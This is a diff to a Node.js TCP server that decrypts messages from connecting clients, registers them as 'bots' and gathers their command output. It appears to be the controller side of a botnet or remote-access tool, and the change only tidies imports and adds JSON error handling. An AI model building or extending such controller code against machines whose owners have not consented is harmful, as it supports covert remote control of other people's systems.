@@ -1,8 +1,8 @@
 import { createServer } from 'net';
 import { unencryptCMD } from './encryption.js';
-import {api} from "./api.js"
+import { api } from "./api.js"
 import { bots, socket_map, requests } from "./db.js"
-import {config} from 'dotenv'
+import { config } from 'dotenv'
 config()
 
 const api_port = process.env.API_PORT || 3000
@@ -11,17 +11,21 @@ const socket_port = process.env.SOCKET_PORT || 9000
 const socketServer = createServer((socket) => {
 
     socket.on('data', (rawData) => {
-        const decrypedData = unencryptCMD(rawData.toString()).trim();
-        const data = JSON.parse(decrypedData);
-        if (data['Type'] == "Connection") {
-            data['Status'] = "Connected"
-            data['Socket'] = socket;
-            bots[data['ID']] = data;
-            socket_map[socket] = data['ID'];
-            console.log('Client connected: ' + data);
-        } else if (data['Type'] == "Output") {
-            requests[data["RequestID"]].push(data)
-            console.log(requests)
+        const decryptedData = unencryptCMD(rawData.toString()).trim();
+        try {
+            const data = JSON.parse(decryptedData);
+            if (data['Type'] == "Connection") {
+                data['Status'] = "Connected"
+                data['Socket'] = socket;
+                bots[data['ID']] = data;
+                socket_map[socket] = data['ID'];
+                console.log('Client connected: ' + data);
+            } else if (data['Type'] == "Output") {
+                requests[data["RequestID"]].push(data)
+                console.log(requests)
+            }
+        } catch (SyntaxError) {
+            console.log("Failed to parse JSON data: " + decryptedData);
         }
     });
 
